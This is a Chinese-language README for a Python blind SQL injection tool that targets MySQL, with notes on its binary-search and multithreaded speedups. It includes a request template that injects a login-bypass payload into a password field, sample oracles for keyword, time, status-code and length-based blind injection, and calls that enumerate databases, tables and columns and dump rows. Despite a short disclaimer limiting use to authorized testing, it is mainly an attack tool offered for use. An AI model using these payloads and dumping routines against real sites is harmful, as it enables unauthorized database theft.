# MySQL SQL注入测试工具

一个基于二分搜索优化的MySQL SQL盲注测试工具，经过性能优化，大幅提升注入检测速度。

## ⚠️ 重要声明

**本工具仅用于授权的安全测试和渗透测试。请确保您有合法的权限对目标系统进行测试。**

## 🚀 优化特性

### 性能优化
- **纯二分搜索算法**: 替代原有的步进+二分混合算法，大幅减少请求次数
- **字符集优化**: 简化字符集定义，提高字符搜索效率
- **多线程支持**: 支持并行获取列名和数据，提升扫描速度
- **代码精简**: 减少重复代码，提高代码可维护性

### 速度提升
- **计数查询**: 从O(n)优化到O(log n)，减少约90%的请求次数
- **字符串提取**: 从O(n)优化到O(log n)，每个字符最多需要log₂(字符集大小)次请求
- **并行处理**: 多线程同时处理多个列，提升整体效率

## 🎯 核心设计

**req函数完全由用户自定义**，包括：
- 目标URL
- 请求方式（GET/POST等）
- 请求参数和注入点
- 代理设置
- 请求头
- 判断注入成功的逻辑
- 错误处理

## 📖 使用方法

### 1. 修改req函数

打开 `mysql_sql_inject.py`，找到 `req` 函数，根据您的目标环境修改：

```python
def req(payload):
    # ========== 用户自定义区域开始 ==========
    
    # 1. 修改目标URL
    url = "http://your-target.com/login.php"
    
    # 2. 修改请求参数（根据实际注入点）
    data = "username=admin&password=admin' or "+str(payload)+" #"
    
    # 3. 修改请求头
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    # 4. 修改代理设置（可选）
    proxies = {
        "http": "http://127.0.0.1:8080",
        "https": "http://127.0.0.1:8080",
    }
    
    # 5. 发送请求
    r = requests.post(url=url, proxies=proxies, headers=headers, data=data)
    resContent = r.content
    
    # 6. 自定义判断逻辑
    if "登录成功" in resContent.decode('utf-8'):
        return 1  # 注入成功
    else:
        return 2  # 注入失败
    
    # ========== 用户自定义区域结束 ==========
```

### 2. 常见判断逻辑示例

#### 基于关键词的盲注
```python
if "success" in resContent.decode('utf-8'):
    return 1
else:
    return 2
```

#### 基于时间的盲注
```python
import time
start_time = time.time()
r = requests.post(url=url, proxies=proxies, headers=headers, data=data)
end_time = time.time()

if (end_time - start_time) > 2.0:  # 延迟超过2秒
    return 1
else:
    return 2
```

#### 基于HTTP状态码的盲注
```python
if r.status_code == 200:
    return 1
else:
    return 2
```

#### 基于响应长度的盲注
```python
if len(resContent) > 1000:
    return 1
else:
    return 2
```

### 3. 使用工具

```python
# 基础功能
databases = get_dbs()                    # 获取所有数据库
tables = get_tables("testdb")            # 获取指定数据库的表
columns = get_columns("testdb", "users") # 获取指定表的列
data = get_data("testdb", "users", "username") # 获取指定列的数据

# 高级功能
all_data = get_all_data("testdb", "users", max_rows=5)  # 获取表的所有数据
quick_data = quick_scan("testdb", "users")              # 快速扫描表数据
db_info = get_database_info()                           # 获取数据库信息摘要

# 多线程功能（提升速度）
parallel_columns = parallel_get_columns("testdb", "users")  # 多线程获取列名
parallel_data = parallel_get_data("testdb", "users")        # 多线程获取行数据
```

## 🔧 主要函数

### 基础函数
- `get_dbs()`: 获取所有数据库
- `get_tables(db_name)`: 获取指定数据库的表
- `get_columns(db_name, table_name)`: 获取指定表的列
- `get_data(db_name, table_name, column_name)`: 获取指定列的数据

### 高级函数
- `get_all_data(db_name, table_name, max_rows=10)`: 获取表的所有数据
- `quick_scan(db_name, table_name, max_rows=3)`: 快速扫描表数据
- `get_database_info()`: 获取数据库信息摘要

### 多线程函数（提升速度）
- `parallel_get_columns(db_name, table_name)`: 多线程获取列名
- `parallel_get_data(db_name, table_name)`: 多线程获取行数据

## ⚡ 性能对比

| 功能 | 原版本 | 优化版本 | 提升幅度 |
|------|--------|----------|----------|
| 计数查询 | O(n) | O(log n) | ~90% |
| 字符提取 | O(n) | O(log n) | ~90% |
| 代码行数 | 350+ | 250+ | ~30% |
| 多线程支持 | 部分 | 完整 | 100% |

## 🚨 注意事项

1. **授权测试**: 确保有合法的测试权限
2. **req函数验证**: 仔细测试req函数的判断逻辑
3. **请求频率**: 控制请求频率，避免对目标造成压力
4. **错误处理**: 在req函数中添加适当的错误处理
5. **多线程使用**: 多线程功能会同时发送多个请求，注意控制并发数

## 📝 示例

```python
# 运行工具
python mysql_sql_inject.py

# 或者在其他脚本中导入使用
from mysql_sql_inject import get_dbs, get_tables, get_columns, quick_scan

# 获取数据库信息
databases = get_dbs()
for db in databases:
    tables = get_tables(db)
    print(f"数据库 {db}: {tables}")
    
    # 快速扫描每个表
    for table in tables[:3]:  # 只扫描前3个表
        quick_scan(db, table)
```

## 🔍 算法优化说明

### 二分搜索优化
- **原算法**: 先大步长搜索，再小步长精确定位
- **优化算法**: 直接使用二分搜索，每次请求都能排除一半的搜索空间
- **性能提升**: 从O(n)优化到O(log n)

### 字符集优化
- **原算法**: 复杂的字符集定义和范围计算
- **优化算法**: 简化的字符集定义，直接使用ASCII范围
- **性能提升**: 减少字符集计算开销

### 多线程优化
- **原算法**: 单线程顺序处理
- **优化算法**: 多线程并行处理列名和数据获取
- **性能提升**: 充分利用网络I/O等待时间

---

**核心要点：根据目标系统的响应特征，正确编写req函数的判断逻辑是成功的关键！**

**优化亮点：二分搜索算法大幅提升检测速度，多线程支持进一步提升效率！**
